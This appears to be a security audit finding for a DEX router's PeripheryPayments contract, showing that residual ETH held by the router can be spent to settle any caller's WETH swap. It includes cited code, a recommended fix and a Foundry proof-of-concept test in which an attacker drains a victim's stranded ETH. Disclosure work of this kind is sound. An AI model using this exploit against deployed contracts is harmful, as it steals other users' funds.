The vulnerability is real. Here is the full analysis:

---

### Title
Router ETH Balance Consumed for Any Caller's WETH Swap — Residual ETH Stolen via `tokenIn=WETH9` — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

`PeripheryPayments.pay()` contains a WETH branch that, when the router holds any native ETH, wraps and spends that ETH to settle the swap instead of pulling WETH from the designated payer. Because all swap entry points (`exactInputSingle`, `exactInput`, `exactOutputSingle`, `exactOutput`) are `payable`, ETH can accumulate in the router across transactions. An attacker who calls any swap with `tokenIn=WETH9` while the router holds residual ETH will have their swap settled using that ETH — paying nothing themselves — and draining funds that belong to other users.

---

### Finding Description

`pay()` in `PeripheryPayments.sol` handles the WETH token case as follows:

```solidity
} else if (token == WETH) {
    uint256 nativeBalance = address(this).balance;
    if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);   // router's ETH, not payer's WETH
    } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance); // partial pull
    } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value); // normal path
    }
}
``` [1](#0-0) 

The branch checks `address(this).balance` — the router's own ETH — with no verification that this ETH was deposited by the current `payer`. If the router holds any ETH, it is consumed first, and the payer is charged nothing (or only the shortfall).

ETH enters the router legitimately via any `payable` swap function. For example, a user doing an exact-output WETH swap via `multicall{value: 1 ether}` where the actual input is only 0.7 ETH leaves 0.3 ETH stranded in the router until `refundETH` is called. All four swap entry points are declared `payable`: [2](#0-1) 

The `_justPayCallback` path (used by `CALLBACK_MODE_JUST_PAY`) passes the transient-stored `tokenToPay` and `payer` directly to `pay()` with no additional guard: [3](#0-2) 

The transient context is set from caller-supplied `params.tokenIn`: [4](#0-3) 

There is no check that the ETH in the router was contributed by the current transaction's `msg.sender`.

---

### Impact Explanation

Any ETH stranded in the router (from prior users who did not call `refundETH`) can be stolen. An attacker calls `exactInputSingle` with `tokenIn=WETH9` and `amountIn` equal to the router's ETH balance. `pay()` wraps the router's ETH and sends WETH to the pool; the attacker receives swap output without spending any of their own WETH or ETH. The prior user's ETH is permanently lost.

This is a direct loss of user principal with no trust assumption required beyond the router holding residual ETH, which is a normal operational state.

---

### Likelihood Explanation

Residual ETH in the router is a routine occurrence:
- Any `multicall{value: X}` for a WETH exact-output swap where actual input < X leaves ETH behind.
- Any `payable` swap call with ETH sent for a non-WETH token leaves ETH behind.
- Users who forget to append `refundETH` to their multicall (a common mistake) leave ETH behind.

The attack requires no special permissions, no malicious pool, and no non-standard token behavior. It is executable by any EOA against any factory-registered WETH pool.

---

### Recommendation

When `payer != address(this)` (i.e., the payer is an external user, not the router itself mid-path), the WETH branch should **only** use `safeTransferFrom` from the payer's WETH balance. The ETH-wrapping shortcut should be restricted to the case where `payer == address(this)` (the router is paying from its own balance mid-path), or the ETH used must be verified to have been sent in the current call (e.g., tracked via a transient `msg.value` slot set at entry).

A minimal fix: remove the ETH-first logic from the `payer != address(this)` branch entirely and always use `safeTransferFrom` when an external payer is responsible. Users who want to pay with ETH should wrap it themselves before calling, or the router should wrap `msg.value` at entry and track it separately.

---

### Proof of Concept

```solidity
// Foundry test sketch
function test_attackerDrainsResidualETH() public {
    // 1. Victim sends ETH with a multicall for a WETH exact-output swap.
    //    Actual input is 0.7 ETH; victim sent 1 ETH; 0.3 ETH stays in router.
    vm.deal(victim, 1 ether);
    vm.prank(victim);
    router.multicall{value: 1 ether}(
        [abi.encodeCall(router.exactOutputSingle, (ExactOutputSingleParams({
            pool: wethPool,
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountOut: someAmount,
            amountInMaximum: 1 ether,
            recipient: victim,
            deadline: block.timestamp + 1,
            priceLimitX64: 0,
            extensionData: ""
        })))]
        // NOTE: no refundETH call — 0.3 ETH stranded
    );
    assertEq(address(router).balance, 0.3 ether); // residual ETH

    // 2. Attacker calls exactInputSingle with tokenIn=WETH, amountIn=0.3 ETH.
    //    No WETH approval needed; pay() will use router's ETH.
    uint256 attackerWethBefore = weth.balanceOf(attacker);
    vm.prank(attacker);
    router.exactInputSingle(ExactInputSingleParams({
        pool: wethPool,
        tokenIn: address(weth),   // triggers ETH branch in pay()
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: 0.3 ether,
        amountOutMinimum: 0,
        recipient: attacker,
        deadline: block.timestamp + 1,
        priceLimitX64: 0,
        extensionData: ""
    }));

    // Attacker spent no WETH, router ETH is gone (victim's funds stolen)
    assertEq(weth.balanceOf(attacker), attackerWethBefore); // no WETH spent
    assertEq(address(router).balance, 0);                   // router ETH drained
}
```

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L73-84)
```text
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
      } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
      }
```

**File:** metric-periphery/contracts/interfaces/IMetricOmmSimpleRouter.sol (L166-174)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);

  function exactInput(ExactInputParams calldata params) external payable returns (uint256 amountOut);

  // ============ Mutating: exact output ============

  function exactOutputSingle(ExactOutputSingleParams calldata params) external payable returns (uint256 amountIn);

  function exactOutput(ExactOutputParams calldata params) external payable returns (uint256 amountIn);
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L71-71)
```text
    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L192-199)
```text
  function _justPayCallback(int256 amount0Delta, int256 amount1Delta) private {
    pay(
      _getTokenToPay(),
      _getPayer(),
      msg.sender,
      uint256(MetricOmmSwapResults.extractPositiveAmount(amount0Delta, amount1Delta))
    );
  }
```
